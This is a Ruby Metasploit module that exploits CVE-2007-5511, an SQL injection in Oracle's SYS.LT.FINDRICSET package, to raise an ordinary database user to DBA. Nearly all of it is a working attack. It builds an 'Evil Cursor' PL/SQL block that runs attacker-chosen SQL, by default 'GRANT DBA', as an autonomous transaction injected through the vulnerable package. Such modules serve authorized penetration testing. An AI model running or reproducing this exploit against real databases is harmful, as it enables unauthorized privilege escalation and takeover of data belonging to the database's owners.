##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::ORACLE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method',
			'Description'    => %q{
					This module will escalate a Oracle DB user to DBA by exploiting 
					an sql injection bug in the SYS.LT.FINDRICSET package via Evil 
					Cursor technique. Tested on oracle 10.1.0.3.0 -- should work on 
					thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical 
					Patch update October 2007.
					},
			'Author'         => ['CG'],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'BID', '26098' ],
					[ 'CVE', '2007-5511'],
					[ 'URL', 'http://rawlab.mindcreations.com/codes/exp/oracle/sys-lt-findricsetV2.sql'],
					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuoct2007.html'],
				],
			'DisclosureDate' => 'Oct 17 2007'))

			register_options( 
				[
					OptString.new('SQL', [ false, 'SQL to execute.',  "GRANT DBA to #{datastore['DBUSER']}"]),		
				], self.class)
	end

	def run
		p     = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

		cursor = "
			DECLARE
			#{p} NUMBER;
			BEGIN
  			#{p} := DBMS_SQL.OPEN_CURSOR;
  			DBMS_SQL.PARSE(#{p},'declare pragma autonomous_transaction; begin execute immediate 				''#{datastore['SQL'].upcase}'';commit;end;',0);
			SYS.LT.FINDRICSET('.''||dbms_sql.execute('||#{p}||')||'''')--','');
			END;"

		begin
			print_status("Sending Evil Cursor and SQLI...")
			prepare_exec(cursor)
		rescue => e
			return
		end
	end

end
